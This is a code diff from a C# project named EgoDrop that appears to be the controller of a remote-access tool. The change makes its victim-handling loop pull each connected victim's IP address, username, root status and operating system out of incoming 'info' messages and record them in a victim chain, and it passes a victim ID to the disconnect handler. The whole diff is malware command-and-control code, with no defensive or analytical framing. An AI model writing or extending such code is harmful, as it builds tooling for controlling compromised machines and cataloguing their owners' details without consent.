@@ -100,6 +100,8 @@ namespace EgoDrop
 
             try
             {
+                string szVictimID = string.Empty;
+
                 clsEDP edp = null;
                 clsVictim victim = (clsVictim)ar.AsyncState;
                 SslStream sslClnt = victim.m_sslClnt;
@@ -154,11 +156,18 @@ namespace EgoDrop
                                     }
 
                                     string szSrcVictimID = lsVictim.Last();
-
                                     fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
 
                                     if (lsMsg[0] == "info")
-                                        fnOnAddChain(lsVictim);
+                                    {
+                                        szVictimID = szSrcVictimID;
+                                        string szIPv4 = lsMsg[3];
+                                        string szUsername = lsMsg[5];
+                                        bool bRoot = string.Equals(lsMsg[7], "1");
+                                        string szOS = lsMsg[8];
+
+                                        fnOnAddChain(lsVictim, szOS, szUsername, bRoot, szIPv4);
+                                    }
                                 }
                             }
                             else if (edp.m_nCommand == 1)
@@ -177,7 +186,7 @@ namespace EgoDrop
                 }
                 while (nRecvLength > 0);
 
-                fnOnVictimDisconnected(victim);
+                fnOnVictimDisconnected(victim, szVictimID);
             }
             catch (Exception ex)
             {
